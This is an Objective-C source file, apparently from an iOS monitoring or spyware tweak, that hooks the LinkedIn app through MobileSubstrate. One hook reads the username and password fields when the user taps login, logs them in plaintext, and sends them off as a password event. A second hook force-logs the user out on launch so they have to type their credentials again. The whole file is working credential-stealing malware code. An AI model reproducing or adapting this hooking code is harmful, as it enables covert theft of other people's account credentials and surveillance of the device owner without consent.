//
//  LinkedInPwd.h
//  MSFSP
//
//  Created by Makara Khloth on 1/18/16.
//
//

#import "MSFSP.h"
#import "DateTimeFormat.h"
#import "FxPasswordEvent.h"
#import "PasswordController.h"

#import "VoyagerAppDelegate.h"
#import "VoyagerCoreAuth.h"

#import <objc/runtime.h>

#pragma mark Swift
#pragma mark Capture password

// 9.0.2
void (*loginViewControllerLoginTapped)(id self);
MSHook(void, loginViewControllerLoginTapped, id self) {
    DLog(@"\n\n&&&&&&&&&&&&&& LoginViewController --> loginTapped &&&&&&&&&&&&&&\n\n");
    
    UITextField *usernameTextField = [self performSelector:@selector(usernameTextField) withObject:nil];
    UITextField *passwordTextField = [self performSelector:@selector(passwordTextField) withObject:nil];
    
    NSString *account = usernameTextField.text;
    NSString *password = passwordTextField.text;
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    _loginViewControllerLoginTapped(self);
}

#pragma mark Force log out

// 9.0.2
// Original class name is Voyager.AppDelegate in framework
HOOK(VoyagerAppDelegate, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& VoyagerAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    BOOL retValue = CALL_ORIG(VoyagerAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLinkedIn]) {
        DLog(@"!!!!! FORCE LOGOUT LinkedIn !!!!!!")
        
        Class $VoyagerCoreAuth(objc_getClass("_TtC11VoyagerCore4Auth"));
        id voyagerCoreAuth = [$VoyagerCoreAuth performSelector:@selector(sharedInstance) withObject:nil];
        [voyagerCoreAuth performSelector:@selector(logout) withObject:nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kLinkedIn logOut:kReset];
    }
    
    return retValue;
}